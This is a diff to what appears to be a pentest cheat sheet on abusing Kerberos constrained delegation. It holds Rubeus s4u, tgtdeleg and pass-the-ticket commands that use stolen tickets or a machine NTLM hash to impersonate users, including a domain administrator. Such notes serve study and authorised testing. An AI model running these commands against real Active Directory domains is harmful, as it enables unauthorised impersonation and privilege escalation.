@@ -728,14 +728,14 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 
 #### SFU - constrained delegation user 
 
-Rubeus (can put ```/ptt``` to pass ticket now):
+Rubeus (can put ```/ptt``` to inject ticket directly, or save for later):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
 
-again:
 
-https://github.com/GhostPack/Rubeus#tgtdeleg
+Another example:
 
 ```Rubeus.exe tgtdeleg```
+https://github.com/GhostPack/Rubeus#tgtdeleg
 
 ```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt```
 
@@ -743,7 +743,9 @@ https://github.com/GhostPack/Rubeus#tgtdeleg
 
 #### SFU - constrained delegation machine
 
-We could also just do it all in one RUBEUS command e.g., constrained delegation machine in possession of machine account NTLM hash:
+We could also just do it all in one command 
+
+in possession of constrained delegation machine account NTLM hash:
 
 ```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase```
 
